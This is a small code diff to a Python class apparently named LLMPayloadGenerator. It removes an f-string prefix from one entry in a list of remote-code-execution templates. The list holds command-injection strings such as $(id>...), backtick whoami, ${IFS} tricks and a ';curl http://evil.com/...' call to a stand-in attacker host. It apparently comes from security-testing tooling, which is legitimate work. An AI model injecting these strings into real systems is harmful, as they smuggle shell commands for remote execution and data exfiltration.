@@ -152,7 +152,7 @@ class LLMPayloadGenerator:
         templates = {
             'rce': [
                 f"$(id>{seed})",
-                f"`whoami|base64`",
+                "`whoami|base64`",
                 f"${{IFS}}cat${{{seed}}}",
                 f";curl http://evil.com/{seed}",
                 f"&&echo$IFS$9{seed}"
